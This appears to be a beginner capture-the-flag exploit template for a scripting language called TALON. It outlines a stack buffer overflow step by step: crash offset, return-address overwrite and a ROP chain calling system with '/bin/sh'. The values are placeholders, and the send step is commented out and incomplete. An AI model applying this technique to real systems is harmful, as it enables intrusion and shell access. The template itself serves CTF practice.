# ═══════════════════════════════════════════════════════════════════════════
# BEGINNER CTF TEMPLATE - Step-by-Step Guide
# ═══════════════════════════════════════════════════════════════════════════
# This template shows you how to write a basic exploit in TALON
# Follow the numbered steps and replace the values with your target info

print(" TALON CTF Exploit Template")
print("════════════════════════════════════════")

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 1: Configure your target                                           │
# └─────────────────────────────────────────────────────────────────────────┘
let target_host = "127.0.0.1"
let target_port = 9999
let binary_name = "vuln_binary"

print("Target:", target_host, ":", target_port)
print("Binary:", binary_name)

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 2: Find the crash offset                                           │
# └─────────────────────────────────────────────────────────────────────────┘
# Generate a pattern to find where the crash happens
# NOTE: Pattern generation works best with smaller sizes
let pattern_size = 100
print("\n Pattern size:", pattern_size, "(use cyclic() with this)")

# TODO: Send pattern to target, check crash
# When you find the crash value, use cyclic_find() to get offset
let crash_offset = 72
print(" Crash offset found:", crash_offset)

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 3: Build your payload                                              │
# └─────────────────────────────────────────────────────────────────────────┘
# Create padding to reach the return address
print("\n Building payload...")

# Set your return address (replace with actual address)
let ret_address = 0x08048abc
print("   Return address:", ret_address)

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 4: Add shellcode or ROP chain                                      │
# └─────────────────────────────────────────────────────────────────────────┘
# Option A: Simple return address overwrite
# let simple_payload = padding + p64(ret_address)

# Option B: ROP chain
let pop_rdi = 0x401234
let bin_sh = 0x403e50
let system_addr = 0x401120

let rop_chain = [pop_rdi, bin_sh, system_addr]

print("\n️  ROP chain created with 3 gadgets")

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 5: Choose your payload                                             │
# └─────────────────────────────────────────────────────────────────────────┘
# Choose your attack method
print("\n Payload strategy: ROP chain exploitation")

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 6: Test locally first!                                             │
# └─────────────────────────────────────────────────────────────────────────┘
print("\n TIP: Always test locally first!")
print("   1. Run binary in debugger")
print("   2. Verify crash at correct offset")
print("   3. Check RIP/EIP control")
print("   4. Then send to remote target")

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ STEP 7: Send exploit (uncomment when ready)                             │
# └─────────────────────────────────────────────────────────────────────────┘
# connect to target_host on port target_port
# send final_payload
# interactive

print("\n Template complete! Replace TODOs with your values.")
print("════════════════════════════════════════")
